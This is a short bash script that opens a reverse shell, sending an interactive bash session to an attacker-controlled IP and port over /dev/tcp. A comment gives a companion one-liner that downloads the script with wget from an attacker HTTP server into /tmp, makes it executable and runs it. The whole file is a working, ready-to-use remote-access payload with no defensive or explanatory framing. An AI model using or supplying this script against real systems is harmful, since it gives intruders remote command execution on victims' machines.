#!/bin/bash
bash -c "bash -i >& /dev/tcp/${ATTACK_IP}/${ATTACK_PORT} 0>&1"

# Can be used with triggering the following set of commands:
# wget http://${ATTACKER_IP}:${ATTACKER_HTTP_PORT}/shell.sh -O /tmp/shell.sh;chmod 700 /tmp/shell.sh; bash -c /tmp/shell.sh
